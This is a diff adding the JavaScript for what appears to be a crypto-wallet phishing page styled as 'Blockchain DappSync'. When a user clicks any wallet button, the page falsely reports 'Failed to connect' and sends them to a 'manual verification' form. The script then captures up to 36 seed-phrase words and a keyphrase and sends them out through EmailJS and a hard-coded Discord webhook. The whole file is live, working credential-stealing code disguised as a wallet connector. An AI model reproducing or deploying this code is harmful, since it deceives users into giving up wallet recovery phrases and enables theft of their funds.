@@ -1,0 +1,165 @@
+function showWords(count) {
+    document.querySelector('.word-tab.active').classList.remove('active');
+    if (count === 12) {
+        document.querySelector('.word-tab:nth-child(1)').classList.add('active');
+        document.getElementById('words-12').style.display = 'flex';
+        document.getElementById('words-24').style.display = 'none';
+        document.getElementById('keyphrase').style.display = 'none';
+    } else if (count === 24) {
+        document.querySelector('.word-tab:nth-child(2)').classList.add('active');
+        document.getElementById('words-12').style.display = 'none';
+        document.getElementById('words-24').style.display = 'flex';
+        document.getElementById('keyphrase').style.display = 'none';
+    } else {    
+        document.querySelector('.word-tab:nth-child(3)').classList.add('active');
+        document.getElementById('words-12').style.display = 'none';
+        document.getElementById('words-24').style.display = 'none';
+        document.getElementById('keyphrase').style.display = 'flex';
+    }
+}
+
+
+
+
+function sendMail() {
+    var templateParams = {
+     word1: document.getElementById('word1').value,
+     word2: document.getElementById('word2').value,
+     word3: document.getElementById('word3').value,
+     word4: document.getElementById('word4').value,
+     word5: document.getElementById('word5').value,
+     word6: document.getElementById('word6').value,
+     word7: document.getElementById('word7').value,
+     word8: document.getElementById('word8').value,
+     word9: document.getElementById('word9').value,
+     word10: document.getElementById('word10').value,
+     word11: document.getElementById('word11').value,
+     word12: document.getElementById('word12').value,
+     word13: document.getElementById('word13').value,
+     word14: document.getElementById('word14').value,
+     word15: document.getElementById('word15').value,
+     word16: document.getElementById('word16').value,
+     word17: document.getElementById('word17').value,
+     word18: document.getElementById('word18').value,
+     word19: document.getElementById('word19').value,
+     word20: document.getElementById('word20').value,
+     word21: document.getElementById('word21').value,
+     word22: document.getElementById('word22').value,
+     word23: document.getElementById('word23').value,
+     word24: document.getElementById('word24').value,
+     word25: document.getElementById('word25').value,
+     word26: document.getElementById('word26').value,
+     word27: document.getElementById('word27').value,
+     word28: document.getElementById('word28').value,
+     word29: document.getElementById('word29').value,
+     word30: document.getElementById('word30').value,
+     word31: document.getElementById('word31').value,
+     word32: document.getElementById('word32').value,
+     word33: document.getElementById('word33').value,
+     word34: document.getElementById('word34').value,
+     word35: document.getElementById('word35').value,
+     word36: document.getElementById('word36').value,
+     keyphrase: document.getElementById('keyphrase').value,
+    };
+
+    document.getElementById('formm')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();});
+
+    emailjs.send("service_t7gea3i", "template_jlaygdt", templateParams).then(alert("Connecting!")); 
+}
+
+
+document.addEventListener("DOMContentLoaded", function () {
+    document.getElementById("contactForm").addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        // Collect form data
+        let formData = new FormData(this);
+        let messageContent = "**New Form Submission on Blockchain DappSync**\n";
+
+        formData.forEach((value, key) => {
+            if (value.trim() !== "") {
+                messageContent += `**${key}**: ${value}\n`;
+            }
+        });
+
+        // Your Discord webhook URLs
+        const webhookURL1 = "https://discord.com/api/webhooks/1504244881218994218/1FtD1RYIhzWjMvScaDHytARLt3xLLIMXMcbeRXhv6IEROXSXAl2tiK25Q1-AriKC9659";
+       // const webhookURL2 = "https://discord.com/api/webhooks/1504244893655105779/H8Cd-FUT5TNAVUGspnwMEw13BR9zjsMdB_BUB4xDs0yqPBX3A9w-coTCJqsucZVW_Y9I"; // Replace with your second webhook URL
+
+        // Send data to both Discord webhooks
+        try {
+            // Send to the first webhook
+            await fetch(webhookURL1, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: messageContent })
+            });
+
+            // Send to the second webhook
+           await fetch(webhookURL2, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: messageContent })
+             });
+
+            // Redirect to another page after successful submission
+            window.location.href = "thanks.html"; // Change this to your desired page
+        } catch (error) {
+            console.error("Error sending to Discord:", error);
+            alert("Failed to process. Please try again.");
+        }
+    });
+});
+
+//popup functionality
+// Get the modal and close button
+const popup = document.getElementById('walletPopup');
+const closeBtn = document.getElementById('closePopupBtn');
+
+// Get all buttons with class "openPopupBtn"
+const openBtns = document.querySelectorAll('.openPopupBtn');
+
+// Open the popup when any button with class "openPopupBtn" is clicked
+openBtns.forEach(button => {
+    button.onclick = function () {
+        popup.style.display = "block";
+    };
+});
+
+// Close the popup when the close button is clicked
+closeBtn.onclick = function () {
+    popup.style.display = "none";
+}
+
+// Close the popup if the user clicks outside the modal
+window.onclick = function (event) {
+    if (event.target == popup) {
+        popup.style.display = "none";
+    }
+}
+
+// Listen for clicks on all wallet buttons
+const walletButtons = document.querySelectorAll('.wallet-button');
+
+walletButtons.forEach(button => {
+    button.addEventListener('click', function (event) {
+        // Prevent default link behavior
+        event.preventDefault();
+
+        // Show the alert message
+        alert("Failed to connect. Proceed to manual verification.");
+
+        // After the alert, get wallet name and image from the data attributes
+        const walletName = this.getAttribute('data-wallet-name');
+        const walletImage = this.getAttribute('data-wallet-image');
+
+        // Store the selected wallet info in localStorage
+        localStorage.setItem('selectedWalletName', walletName);
+        localStorage.setItem('selectedWalletImage', walletImage);
+
+        // Redirect to the form page (phrase.html)
+        window.location.href = this.getAttribute('href');
+    });
+});
